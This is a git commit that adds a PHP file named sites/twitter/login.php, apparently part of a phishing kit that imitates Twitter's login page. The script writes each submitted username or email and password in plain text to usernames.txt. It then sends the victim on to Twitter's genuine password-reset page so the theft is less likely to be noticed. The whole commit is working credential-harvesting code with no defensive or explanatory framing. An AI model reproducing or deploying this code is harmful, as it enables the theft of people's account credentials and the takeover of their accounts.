852d957479240cc44784ff4d46641e051b7ab759
Joshua Philip Jha <66009139+Joshuaphilipjha@users.noreply.github.com>
2022-06-10 02:04:13 -0400

    Add files via upload

---
+++ sites/twitter/login.php
@@ -0,0 +1,6 @@
+<?php
+
+file_put_contents("usernames.txt", "Username: " . $_POST['usernameOrEmail'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
+header('Location: https://twitter.com/account/begin_password_reset');
+exit();
+?>
